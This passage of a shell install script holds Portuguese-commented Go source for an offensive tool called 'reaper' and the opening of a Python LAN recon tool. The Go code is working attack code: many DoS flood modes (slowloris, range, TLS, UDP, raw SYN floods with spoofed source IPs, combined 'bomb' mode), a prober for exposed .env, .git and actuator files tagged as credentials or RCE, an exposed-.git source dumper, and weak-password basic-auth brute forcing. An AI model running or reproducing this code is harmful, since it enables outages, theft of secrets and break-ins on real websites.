				conn, err := dial(host, port, useTLS)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				br := bufio.NewReader(conn)
				buf := make([]byte, 8192)
				for {
					select {
					case <-stop:
						conn.Close()
						return
					default:
					}
					p := path + "/" + randStr(7)
					var req string
					if post {
						body := randStr(bodySize)
						req = "POST " + p + " HTTP/1.1\r\nHost: " + vhost + "\r\nUser-Agent: " +
							randUA() + "\r\nContent-Type: application/x-www-form-urlencoded\r\n" +
							"Content-Length: " + strconv.Itoa(len(body)) +
							"\r\nConnection: keep-alive\r\n\r\n" + body
					} else {
						req = "GET " + p + " HTTP/1.1\r\nHost: " + vhost + "\r\nUser-Agent: " +
							randUA() + "\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n" +
							"Connection: keep-alive\r\n\r\n"
					}
					conn.SetWriteDeadline(time.Now().Add(8 * time.Second))
					if _, err := conn.Write([]byte(req)); err != nil {
						break
					}
					atomic.AddInt64(&reqCount, 1)
					conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
					for {
						n, err := br.Read(buf)
						if n > 0 {
							atomic.AddInt64(&byteCount, int64(n))
						}
						if err != nil {
							break
						}
					}
					conn.SetReadDeadline(time.Time{})
				}
				conn.Close()
			}
		}()
	}
}

func slowloris(host string, port int, useTLS bool, path string, conc int, stop <-chan struct{}) {
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				conn, err := dial(host, port, useTLS)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				fmt.Fprintf(conn, "GET %s/%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
					path, randStr(7), vhost, randUA())
				for i := 0; i < 60; i++ {
					select {
					case <-stop:
						conn.Close()
						return
					case <-time.After(4 * time.Second):
					}
					conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
					if _, err := fmt.Fprintf(conn, "X-a%d: %s\r\n", i, randStr(24)); err != nil {
						break
					}
					atomic.AddInt64(&reqCount, 1)
				}
				conn.Close()
			}
		}()
	}
}

func rangeFlood(host string, port int, useTLS bool, file string, conc int, stop <-chan struct{}) {
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				conn, err := dial(host, port, useTLS)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				req := "GET " + file + "?b=" + randStr(6) + " HTTP/1.1\r\nHost: " + vhost +
					"\r\nUser-Agent: " + randUA() + "\r\nAccept: */*\r\nRange: bytes=0-" +
					strconv.Itoa(2000000+rand.Intn(8000000)) + "\r\nConnection: keep-alive\r\n\r\n"
				conn.SetWriteDeadline(time.Now().Add(6 * time.Second))
				if _, err := conn.Write([]byte(req)); err != nil {
					conn.Close()
					continue
				}
				atomic.AddInt64(&reqCount, 1)
				conn.SetReadDeadline(time.Now().Add(5 * time.Second))
				n, _ := io.CopyN(io.Discard, conn, 2048)
				atomic.AddInt64(&byteCount, n)
				rstClose(conn)
			}
		}()
	}
}

func churn(host string, port int, useTLS bool, conc int, stop <-chan struct{}) {
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				c, err := dial(host, port, useTLS)
				if err == nil {
					atomic.AddInt64(&connCount, 1)
					atomic.AddInt64(&reqCount, 1)
					rstClose(c)
				}
			}
		}()
	}
}

func tlsFlood(host string, port, conc int, stop <-chan struct{}) {
	sni := gSNI
	if sni == "" {
		sni = host
	}
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				d := &net.Dialer{Timeout: 5 * time.Second}
				c, err := d.Dial("tcp", net.JoinHostPort(host, strconv.Itoa(port)))
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				tc := tls.Client(c, &tls.Config{ServerName: sni, InsecureSkipVerify: true,
					NextProtos: []string{"h2", "http/1.1"}})
				tc.SetDeadline(time.Now().Add(5 * time.Second))
				tc.Handshake()
				atomic.AddInt64(&connCount, 1)
				atomic.AddInt64(&reqCount, 1)
				rstClose(tc)
			}
		}()
	}
}

func udpFlood(host string, port, conc int, stop <-chan struct{}) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	for w := 0; w < conc; w++ {
		go func() {
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-stop:
					return
				default:
				}
				n := 64 + rand.Intn(1350)
				b := make([]byte, n)
				rand.Read(b)
				if _, err := conn.Write(b); err != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}
				atomic.AddInt64(&reqCount, 1)
				atomic.AddInt64(&byteCount, int64(n))
			}
		}()
	}
}

func csum(data []byte) uint16 {
	var s uint32
	for i := 0; i+1 < len(data); i += 2 {
		s += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		s += uint32(data[len(data)-1]) << 8
	}
	for s>>16 > 0 {
		s = (s & 0xffff) + (s >> 16)
	}
	return ^uint16(s)
}

func tcpCsum(src, dst net.IP, seg []byte) uint16 {
	ph := make([]byte, 12+len(seg))
	copy(ph[0:4], src.To4())
	copy(ph[4:8], dst.To4())
	ph[8] = 0
	ph[9] = 6
	binary.BigEndian.PutUint16(ph[10:12], uint16(len(seg)))
	copy(ph[12:], seg)
	return csum(ph)
}

func synFlood(dst net.IP, port, conc int, stop <-chan struct{}) {
	d4 := dst.To4()
	if d4 == nil {
		fmt.Println("[!] modo syn exige IPv4")
		return
	}
	for w := 0; w < conc; w++ {
		go func() {
			fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
			if err != nil {
				fmt.Println("[!] raw socket falhou (root):", err)
				return
			}
			defer syscall.Close(fd)
			syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
			sa := &syscall.SockaddrInet4{Port: port}
			copy(sa.Addr[:], d4)
			buf := make([]byte, 40)
			for {
				select {
				case <-stop:
					return
				default:
				}
				var rnd [8]byte
				rand.Read(rnd[:])
				src := [4]byte{rnd[0]%223 + 1, rnd[1], rnd[2], rnd[3]}
				for i := range buf {
					buf[i] = 0
				}
				buf[0] = 0x45
				binary.BigEndian.PutUint16(buf[2:4], 40)
				binary.BigEndian.PutUint16(buf[4:6], uint16(rnd[4])<<8|uint16(rnd[5]))
				buf[6] = 0x40
				buf[7] = 64
				buf[8] = 6
				copy(buf[12:16], src[:])
				copy(buf[16:20], d4)
				binary.BigEndian.PutUint16(buf[10:12], csum(buf[0:20]))
				binary.BigEndian.PutUint16(buf[20:22], uint16(rnd[6])<<8|uint16(rnd[7]))
				binary.BigEndian.PutUint16(buf[22:24], uint16(port))
				binary.BigEndian.PutUint32(buf[24:28], uint32(rnd[4])<<16|uint32(rnd[5]))
				buf[32] = 0x50
				buf[33] = 0x02
				binary.BigEndian.PutUint16(buf[34:36], 65535)
				binary.BigEndian.PutUint16(buf[36:38], tcpCsum(net.IP(src[:]), d4, buf[20:40]))
				if err := syscall.Sendto(fd, buf, 0, sa); err == nil {
					atomic.AddInt64(&reqCount, 1)
					atomic.AddInt64(&byteCount, 40)
				} else {
					atomic.AddInt64(&errCount, 1)
				}
			}
		}()
	}
}

var assetRe = regexp.MustCompile(`(?i)(?:href|src|data-src)\s*=\s*["']([^"']+\.(?:js|css|png|jpg|jpeg|gif|webp|mp4|webm|pdf|zip|json|wasm))["']`)

func setHost(req *http.Request) {
	if h := hdrHost(); h != "" {
		req.Host = h
	}
}

func biggestAsset(base string) string {
	resp, err := reconClient.Get(base)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
	bu, _ := url.Parse(base)
	best, bestSize := "", int64(0)
	seen := map[string]bool{}
	count := 0
	for _, m := range assetRe.FindAllStringSubmatch(string(body), -1) {
		if count >= 25 {
			break
		}
		ref := m[1]
		if seen[ref] {
			continue
		}
		seen[ref] = true
		count++
		ru, err := bu.Parse(ref)
		if err != nil {
			continue
		}
		ru.RawQuery = ""
		req, _ := http.NewRequest("HEAD", ru.String(), nil)
		req.Header.Set("User-Agent", randUA())
		setHost(req)
		r2, err := reconClient.Do(req)
		if err != nil {
			continue
		}
		sz := r2.ContentLength
		r2.Body.Close()
		if sz > bestSize {
			bestSize = sz
			best = ru.Path
		}
	}
	if best != "" {
		fmt.Printf("[+] maior asset: %s (%d bytes)\n", best, bestSize)
	}
	return best
}

var probePaths = []string{
	"/", "/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.git/config",
	"/.env", "/.env.local", "/.env.production", "/.env.bak", "/env",
	"/config.json", "/config.php.bak", "/config.yml", "/docker-compose.yml",
	"/Dockerfile", "/package.json", "/composer.json", "/yarn.lock",
	"/.DS_Store", "/backup.sql", "/db.sql", "/dump.sql",
	"/admin", "/admin/", "/administrator/", "/wp-admin/", "/wp-login.php",
	"/phpmyadmin/", "/pma/", "/adminer.php", "/cpanel",
	"/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
	"/actuator/httptrace", "/actuator/gateway/routes", "/jolokia/",
	"/server-status", "/server-info", "/debug/pprof/", "/debug/vars",
	"/swagger-ui/", "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
	"/api-docs", "/graphql", "/graphiql", "/altair",
	"/.well-known/security.txt", "/security.txt", "/humans.txt",
	"/console", "/_debug", "/__debug__/", "/telescope", "/horizon",
	"/@vite/client", "/__webpack_hmr", "/webpack-dev-server",
	"/.vscode/settings.json", "/.idea/workspace.xml",
	"/storage/logs/laravel.log", "/laravel.log", "/error.log", "/access.log",
	"/metrics", "/health", "/healthz", "/status", "/version",
	"/api", "/api/", "/api/v1", "/api/health", "/api/users", "/api/config",
	"/uploads/", "/files/", "/static/", "/assets/", "/backup/", "/backups/",
	"/src/", "/dist/", "/build/", "/public/",
	"/phpinfo.php", "/info.php", "/test.php", "/shell.php",
	"/.htaccess", "/web.config", "/nginx.conf",
	"/main.js.map", "/app.js.map", "/index.js.map", "/bundle.js.map",
	"/login", "/signin", "/register", "/dashboard", "/panel",
	"/.git/refs/heads/main", "/.git/refs/heads/master",
	"/.git/objects/info/packs", "/.git/packed-refs",
	"/.svn/entries", "/.hg/requires", "/CVS/Root",
	"/composer.lock", "/Gemfile", "/Gemfile.lock", "/requirements.txt",
	"/server.js", "/app.py", "/manage.py", "/index.php",
	"/sitemap_index.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
	"/trace", "/echo", "/.git/logs/HEAD",
	"/api/swagger.json", "/api/openapi.json", "/openapi.json",
	"/config/database.yml", "/config/secrets.yml",
	"/wp-config.php.bak", "/wp-config.php~",
	"/admin/config.php", "/admin/index.php",
	"/backup.zip", "/backup.tar.gz", "/site.zip", "/www.zip",
	"/db.sql.gz", "/dump.tar.gz",
	"/.git/index", "/.gitignore", "/.editorconfig",
	"/web.config.bak", "/appsettings.json", "/appsettings.Development.json",
}

var highValue = map[string]string{
	"/.git/HEAD":                "CODIGO-FONTE EXPOSTO -> use -m git",
	"/.git/config":              "CODIGO-FONTE EXPOSTO -> use -m git",
	"/.git/logs/HEAD":           "HISTORICO DE COMMITS",
	"/.env":                     "CREDENCIAIS",
	"/.env.local":               "CREDENCIAIS",
	"/.env.production":          "CREDENCIAIS",
	"/actuator/env":             "ENV VAZADO / RCE via defaultZone",
	"/actuator/gateway/routes":  "RCE (SpEL)",
	"/jolokia/":                 "JMX -> RCE",
	"/server-status":            "VHOSTS + IP interno",
	"/debug/pprof/":             "GO DEBUG",
	"/phpmyadmin/":              "DB ADMIN",
	"/adminer.php":              "DB ADMIN",
	"/swagger-ui/":              "API MAP",
	"/v3/api-docs":              "API MAP",
	"/openapi.json":             "API MAP",
	"/graphql":                  "GRAPHQL INTROSPECTION",
	"/package.json":             "STACK + DEPS",
	"/composer.json":            "STACK + DEPS",
	"/composer.lock":            "DEPS EXATAS",
	"/requirements.txt":         "DEPS EXATAS",
	"/Dockerfile":               "INFRA",
	"/docker-compose.yml":       "INFRA",
	"/storage/logs/laravel.log": "LOG VAZADO",
	"/.DS_Store":                "LISTAGEM DE DIRETORIO",
	"/appsettings.json":         "CONFIG .NET",
	"/config/database.yml":      "CREDENCIAIS DB",
	"/wp-config.php.bak":        "CREDENCIAIS WP",
	"/backup.zip":               "BACKUP COMPLETO",
	"/www.zip":                  "BACKUP COMPLETO",
}

func recon(base, outdir, wordlist string) {
	if _, err := url.Parse(base); err != nil {
		fmt.Println("[!] url invalida")
		return
	}
	paths := append([]string{}, probePaths...)
	if wordlist != "" {
		if b, err := os.ReadFile(wordlist); err == nil {
			for _, l := range strings.Split(string(b), "\n") {
				l = strings.TrimSpace(l)
				if l != "" && !strings.HasPrefix(l, "#") {
					if !strings.HasPrefix(l, "/") {
						l = "/" + l
					}
					paths = append(paths, l)
				}
			}
		}
	}
	os.MkdirAll(outdir, 0755)
	fmt.Println("=== RECON:", base, "-> saida em", outdir, "| paths:", len(paths), "===")
	var mu sync.Mutex
	hits := []string{}
	sem := make(chan struct{}, 64)
	var wg sync.WaitGroup
	for _, p := range paths {
		wg.Add(1)
		sem <- struct{}{}
		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }()
			req, _ := http.NewRequest("GET", base+p, nil)
			req.Header.Set("User-Agent", randUA())
			setHost(req)
			resp, err := reconClient.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
			code := resp.StatusCode
			if code == 404 || code == 410 {
				return
			}
			tag := highValue[p]
			line := fmt.Sprintf("%-4d %-8d %s", code, len(body), p)
			if srv := resp.Header.Get("Server"); srv != "" {
				line += "  [srv:" + srv + "]"
			}
			if xp := resp.Header.Get("X-Powered-By"); xp != "" {
				line += "  [pow:" + xp + "]"
			}
			if loc := resp.Header.Get("Location"); loc != "" {
				line += "  -> " + loc
			}
			mu.Lock()
			if tag != "" {
				fmt.Printf(">>> %s   <<< %s\n", line, tag)
				hits = append(hits, p)
			} else if code < 400 {
				fmt.Println("    " + line)
			}
			mu.Unlock()
			if code < 400 && len(body) > 0 {
				name := strings.Trim(strings.ReplaceAll(p, "/", "_"), "_")
				if name == "" {
					name = "index"
				}
				os.WriteFile(filepath.Join(outdir, name), body, 0644)
			}
		}(p)
	}
	wg.Wait()
	fmt.Println("\n=== RESUMO ===")
	if len(hits) == 0 {
		fmt.Println("[*] nada critico. Tente -m crawl e -m brute.")
	}
	for _, h := range hits {
		fmt.Printf("  %-28s %s\n", h, highValue[h])
	}
}

func httpGetBytes(u string) ([]byte, int, error) {
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("User-Agent", randUA())
	setHost(req)
	resp, err := reconClient.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	return b, resp.StatusCode, err
}

func getObject(base, sha string) (string, []byte, error) {
	if len(sha) < 40 {
		return "", nil, fmt.Errorf("sha curto: %q", sha)
	}
	b, code, err := httpGetBytes(base + "/.git/objects/" + sha[:2] + "/" + sha[2:])
	if err != nil || code != 200 {
		return "", nil, fmt.Errorf("obj %s status %d", sha, code)
	}
	zr, err := zlib.NewReader(bytes.NewReader(b))
	if err != nil {
		return "", nil, err
	}
	defer zr.Close()
	raw, err := io.ReadAll(zr)
	if err != nil {
		return "", nil, err
	}
	i := bytes.IndexByte(raw, 0)
	if i < 0 {
		return "", nil, fmt.Errorf("obj corrompido")
	}
	parts := strings.SplitN(string(raw[:i]), " ", 2)
	if len(parts) != 2 {
		return "", nil, fmt.Errorf("header invalido")
	}
	return parts[0], raw[i+1:], nil
}

var gitVisited sync.Map

func walkTree(base, outdir, sha, rel string, depth int) {
	if depth > 16 {
		return
	}
	if _, loaded := gitVisited.LoadOrStore(sha, true); loaded {
		return
	}
	typ, data, err := getObject(base, sha)
	if err != nil || typ != "tree" {
		return
	}
	for len(data) > 0 {
		i := bytes.IndexByte(data, 0)
		if i < 0 || len(data) < i+21 {
			break
		}
		meta := string(data[:i])
		sp := strings.IndexByte(meta, ' ')
		if sp < 0 {
			break
		}
		mode := meta[:sp]
		name := meta[sp+1:]
		childSha := hex.EncodeToString(data[i+1 : i+21])
		data = data[i+21:]
		childRel := filepath.Join(rel, name)
		if mode == "40000" || mode == "040000" {
			walkTree(base, outdir, childSha, childRel, depth+1)
			continue
		}
		bt, bd, err := getObject(base, childSha)
		if err != nil || bt != "blob" {
			continue
		}
		full := filepath.Join(outdir, childRel)
		os.MkdirAll(filepath.Dir(full), 0755)
		os.WriteFile(full, bd, 0644)
		fmt.Printf("  + %-60s %d b\n", childRel, len(bd))
	}
}

func dumpGit(base, outdir string) {
	fmt.Println("=== GIT DUMP:", base, "->", outdir, "===")
	hb, code, err := httpGetBytes(base + "/.git/HEAD")
	if err != nil || code != 200 {
		fmt.Println("[!] .git/HEAD nao exposto (status", code, ")")
		return
	}
	ref := strings.TrimSpace(string(hb))
	var sha string
	if strings.HasPrefix(ref, "ref: ") {
		rb, c2, _ := httpGetBytes(base + "/.git/" + strings.TrimPrefix(ref, "ref: "))
		if c2 != 200 {
			fmt.Println("[!] ref nao encontrada")
			return
		}
		sha = strings.TrimSpace(string(rb))
	} else {
		sha = ref
	}
	if len(sha) < 40 {
		fmt.Println("[!] sha invalido:", sha)
		return
	}
	fmt.Println("[+] commit:", sha)
	os.MkdirAll(outdir, 0755)
	count := 0
	for count < 40 && len(sha) >= 40 {
		typ, data, err := getObject(base, sha)
		if err != nil || typ != "commit" {
			fmt.Println("[!] commit ilegivel, repo provavelmente empacotado. use git-dumper.")
			break
		}
		s := string(data)
		if strings.HasPrefix(s, "tree ") && len(s) >= 45 {
			walkTree(base, outdir, strings.TrimSpace(s[5:45]), "", 0)
		}
		idx := strings.Index(s, "\nparent ")
		if idx < 0 || len(s) < idx+48 {
			break
		}
		sha = strings.TrimSpace(s[idx+8 : idx+48])
		count++
	}
	fmt.Println("[+] concluido. arquivos em", outdir)
}

var (
	linkRe = regexp.MustCompile(`(?i)(?:href|src|action)\s*=\s*["']([^"'#]+)["']`)
	formRe = regexp.MustCompile(`(?is)<form[^>]*>`)
	inputRe = regexp.MustCompile(`(?i)<input[^>]*name\s*=\s*["']([^"']+)["']`)
	mapRe  = regexp.MustCompile(`(?i)sourceMappingURL=([^\s*]+)`)
)

func crawl(base, outfile string) {
	fmt.Println("=== CRAWL:", base, "===")
	req, _ := http.NewRequest("GET", base, nil)
	setHost(req)
	resp, err := reconClient.Do(req)
	if err != nil {
		fmt.Println("[!] falha:", err)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	s := string(body)
	bu, _ := url.Parse(base)
	found := map[string]bool{}
	var out []string
	add := func(kind, v string) {
		if found[kind+v] {
			return
		}
		found[kind+v] = true
		out = append(out, kind+" "+v)
	}
	for _, m := range linkRe.FindAllStringSubmatch(s, -1) {
		ru, err := bu.Parse(m[1])
		if err != nil || ru.Host != bu.Host {
			continue
		}
		add("URL", ru.Path)
	}
	for _, m := range formRe.FindAllString(s, -1) {
		add("FORM", m)
	}
	for _, m := range inputRe.FindAllStringSubmatch(s, -1) {
		add("INPUT", m[1])
	}
	for _, m := range mapRe.FindAllStringSubmatch(s, -1) {
		add("SOURCEMAP", m[1])
	}
	for _, m := range assetRe.FindAllStringSubmatch(s, -1) {
		add("ASSET", m[1])
	}
	os.WriteFile(outfile, []byte(strings.Join(out, "\n")), 0644)
	fmt.Printf("[+] %d itens -> %s\n", len(out), outfile)
	for _, o := range out {
		if strings.HasPrefix(o, "SOURCEMAP") || strings.HasPrefix(o, "FORM") {
			fmt.Println("  " + o)
		}
	}
}

var basicCreds = [][2]string{
	{"admin", "admin"}, {"admin", "password"}, {"admin", "123456"},
	{"admin", "admin123"}, {"admin", ""}, {"root", "root"},
	{"user", "user"}, {"test", "test"}, {"guest", "guest"},
	{"administrator", "administrator"}, {"admin", "senha"}, {"admin", "1234"},
	{"admin", "admin1234"}, {"root", "toor"}, {"admin", "P@ssw0rd"},
}

func brute(base string) {
	fmt.Println("=== BRUTE:", base, "===")
	for _, p := range []string{"/admin", "/admin/", "/phpmyadmin/", "/administrator/",
		"/panel", "/dashboard", "/api", "/"} {
		req, _ := http.NewRequest("GET", base+p, nil)
		setHost(req)
		resp, err := reconClient.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 401 {
			continue
		}
		fmt.Println("[*] 401 em", p, "- tentando basic auth")
		for _, c := range basicCreds {
			req, _ := http.NewRequest("GET", base+p, nil)
			req.SetBasicAuth(c[0], c[1])
			setHost(req)
			r, err := reconClient.Do(req)
			if err != nil {
				continue
			}
			io.Copy(io.Discard, r.Body)
			r.Body.Close()
			if r.StatusCode == 200 {
				fmt.Printf(">>> SUCESSO: %s:%s em %s\n", c[0], c[1], p)
				break
			}
		}
	}
	fmt.Println("[*] brute de form precisa do nome dos campos. use -m crawl primeiro.")
}

func human(b int64) string {
	switch {
	case b > 1<<30:
		return fmt.Sprintf("%.2fGB", float64(b)/(1<<30))
	case b > 1<<20:
		return fmt.Sprintf("%.1fMB", float64(b)/(1<<20))
	case b > 1<<10:
		return fmt.Sprintf("%.1fKB", float64(b)/(1<<10))
	}
	return fmt.Sprintf("%dB", b)
}

func main() {
	mode := flag.String("m", "h2", "modo (use -l para listar)")
	target := flag.String("u", "", "URL ou host alvo")
	hostHdr := flag.String("H", "", "Host header e SNI manuais (obrigatorio contra CDN)")
	conc := flag.Int("c", 500, "concorrencia")
	dur := flag.Duration("t", 60*time.Second, "duracao (0 = infinito)")
	port := flag.Int("p", 443, "porta")
	bodySize := flag.Int("s", 4096, "tamanho do corpo POST")
	file := flag.String("f", "", "arquivo alvo do modo range")
	out := flag.String("o", "", "diretorio de saida")
	streams := flag.Int("k", 64, "streams HTTP/2 por conexao")
	depth := flag.Int("d", 32, "requests por pipe")
	wordlist := flag.String("w", "", "wordlist extra para recon")
	quiet := flag.Bool("q", false, "sem banner")
	list := flag.Bool("l", false, "lista os modos e sai")
	flag.Parse()

	if !*quiet {
		banner()
	}
	if *list {
		for _, s := range []string{
			"h2         GET sobre HTTP/2 multiplexado",
			"rapid      h2 + RST_STREAM imediato (rapid reset)",
			"hpack      h2 com HPACK bomb (headers gigantes)",
			"syn        SYN cru com IP spoofado (root, IPv4)",
			"pipe       pipelining HTTP/1.1 em lote",
			"noread     manda request e nao le (exaustao de FD)",
			"slowpost   Content-Length absurdo + body pingado",
			"malformed  requests invalidos/ambiguos",
			"h1         keep-alive HTTP/1.1",
			"post       keep-alive com corpo",
			"slow       slowloris classico",
			"range      Range gigante em asset grande",
			"churn      abre/fecha conexao em loop (RST)",
			"tls        handshake TLS descartado",
			"udp        datagramas aleatorios",
			"mixed      mistura dos modos",
			"bomb       mixed com peso no h2",
			"analyze    DNS, CDN, crt.sh, origem",
			"recon      probe de ~160 paths sensiveis",
			"git        dump de .git exposto",
			"crawl      extrai links, forms, sourcemaps",
			"brute      basic auth com creds fracas",
		} {
			fmt.Println(s)
		}
		return
	}
	if *target == "" {
		fmt.Println("uso: reaper -m bomb -u https://IP_DA_ORIGEM -H alvo.com -c 500 -t 120s")
		os.Exit(1)
	}

	raw := *target
	if !strings.Contains(raw, "://") {
		raw = "https://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil {
		fmt.Println("URL invalida:", err)
		os.Exit(1)
	}
	host := u.Hostname()
	gHost, gSNI = host, host
	if *hostHdr != "" {
		gHost, gSNI = *hostHdr, *hostHdr
	}
	base := u.Scheme + "://" + u.Host
	od := *out
	if od == "" {
		od = "./" + strings.ReplaceAll(host, ".", "_")
	}

	switch *mode {
	case "analyze":
		analyze(host)
		return
	case "recon":
		recon(base, od, *wordlist)
		return
	case "git":
		dumpGit(base, od)
		return
	case "crawl":
		os.MkdirAll(od, 0755)
		crawl(base, od+"/crawl.txt")
		return
	case "brute":
		brute(base)
		return
	}

	useTLS := u.Scheme == "https"
	p := portOf(u, *port)
	path := normPath(u)
	if *conc < 1 {
		*conc = 1
	}
	if *streams < 1 {
		*streams = 1
	}
	if *depth < 1 {
		*depth = 1
	}
	if *mode == "syn" && os.Geteuid() != 0 {
		fmt.Println("[!] modo syn precisa de root")
	}
	fmt.Printf("alvo=%s host=%s porta=%d tls=%v modo=%s conc=%d streams=%d depth=%d dur=%s\n",
		host, gHost, p, useTLS, *mode, *conc, *streams, *depth, *dur)

	stop := make(chan struct{})
	var once sync.Once
	closeAll := func() { once.Do(func() { close(stop) }) }
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() { <-sig; closeAll() }()
	if *dur > 0 {
		go func() { time.Sleep(*dur); closeAll() }()
	}
	atLeast := func(n int) int {
		if n < 1 {
			return 1
		}
		return n
	}
	c := *conc

	switch *mode {
	case "h2":
		h2Attack(u, path, c, *streams, false, false, stop)
	case "rapid":
		h2Attack(u, path, c, *streams, false, true, stop)
	case "hpack":
		h2Attack(u, path, c, *streams, true, false, stop)
	case "syn":
		ips, _ := net.LookupIP(host)
		var d net.IP
		for _, ip := range ips {
			if ip.To4() != nil {
				d = ip
				break
			}
		}
		if d == nil {
			fmt.Println("[!] nao resolvi IPv4 do alvo")
			os.Exit(1)
		}
		synFlood(d, p, c, stop)
	case "pipe":
		pipeFlood(host, p, useTLS, path, c, *depth, stop)
	case "noread":
		noReadFlood(host, p, useTLS, path, c, stop)
	case "slowpost":
		slowPost(host, p, useTLS, path, c, stop)
	case "malformed":
		malformedFlood(host, p, useTLS, path, c, stop)
	case "h1":
		keepAliveFlood(host, p, useTLS, path, c, false, 0, stop)
	case "post":
		keepAliveFlood(host, p, useTLS, path, c, true, *bodySize, stop)
	case "slow":
		slowloris(host, p, useTLS, path, c, stop)
	case "range":
		f := *file
		if f == "" {
			f = biggestAsset(base + path)
			if f == "" {
				fmt.Println("[!] nenhum asset grande. passe -f manualmente.")
				os.Exit(1)
			}
		}
		rangeFlood(host, p, useTLS, f, c, stop)
	case "churn":
		churn(host, p, useTLS, c, stop)
	case "tls":
		tlsFlood(host, p, c, stop)
	case "udp":
		udpFlood(host, p, c, stop)
	case "mixed":
		h2Attack(u, path, atLeast(c/2), *streams, false, true, stop)
		pipeFlood(host, p, useTLS, path, atLeast(c/3), *depth, stop)
		keepAliveFlood(host, p, useTLS, path, atLeast(c/4), true, *bodySize, stop)
		slowPost(host, p, useTLS, path, atLeast(c/8), stop)
		churn(host, p, useTLS, atLeast(c/8), stop)
	case "bomb":
		h2Attack(u, path, atLeast(c/4), *streams, false, true, stop)
		h2Attack(u, path, atLeast(c/8), *streams, false, false, stop)
		h2Attack(u, path, atLeast(c/12), *streams, true, true, stop)
		pipeFlood(host, p, useTLS, path, atLeast(c/5), *depth, stop)
		noReadFlood(host, p, useTLS, path, atLeast(c/8), stop)
		slowPost(host, p, useTLS, path, atLeast(c/10), stop)
		malformedFlood(host, p, useTLS, path, atLeast(c/10), stop)
		keepAliveFlood(host, p, useTLS, path, atLeast(c/10), false, 0, stop)
		churn(host, p, useTLS, atLeast(c/6), stop)
	default:
		fmt.Println("modo desconhecido. use -l.")
		os.Exit(1)
	}

	start := time.Now()
	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var lr, lb, lc int64
		for {
			select {
			case <-stop:
				return
			case <-t.C:
				cr, cb, cc := atomic.LoadInt64(&reqCount), atomic.LoadInt64(&byteCount),
					atomic.LoadInt64(&connCount)
				fmt.Printf("\r[%.0fs] req/s=%-7d conn/s=%-6d total=%-10d conns=%-8d errs=%-6d %s/s   ",
					time.Since(start).Seconds(), cr-lr, cc-lc, cr, cc,
					atomic.LoadInt64(&errCount), human(cb-lb))
				lr, lb, lc = cr, cb, cc
			}
		}
	}()

	<-stop
	time.Sleep(300 * time.Millisecond)
	fmt.Printf("\n\nFIM dur=%.1fs req=%d conexoes=%d bytes=%s erros=%d\n",
		time.Since(start).Seconds(), atomic.LoadInt64(&reqCount),
		atomic.LoadInt64(&connCount), human(atomic.LoadInt64(&byteCount)),
		atomic.LoadInt64(&errCount))
}
GO

  # ---------------------------------------------------------------- oztek
  cat > "$TOOLS/oztek.py" <<'PY'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OZTEK v4 — recon ofensivo silencioso em LAN, para Termux. Tudo real."""
import os, sys, re, json, time, socket, struct, zlib, ssl, base64, random
import subprocess, threading, queue, argparse, ftplib, ipaddress, hashlib
from datetime import datetime

VERSION = "4.0"
HOME = os.path.expanduser("~")
LOOT = os.path.join(HOME, "oztek_loot")
UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"
T = 2.5

def c(t, k):
    m = {"g":"\033[92m","y":"\033[93m","r":"\033[91m","b":"\033[96m","d":"\033[90m",
         "w":"\033[97m","m":"\033[95m"}
    return f"{m.get(k,'')}{t}\033[0m"

def log(m, k="w"):
    print(f"{c('['+datetime.now().strftime('%H:%M:%S')+']','d')} {c(m,k)}", flush=True)

def loot():
    os.makedirs(LOOT, exist_ok=True); return LOOT

def stamp(): return datetime.now().strftime("%Y%m%d_%H%M%S")

def sh(cmd, timeout=20):
    try:
        r = subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception: return ""

def which(b):
    for p in os.environ.get("PATH", "").split(":"):
        f = os.path.join(p, b)
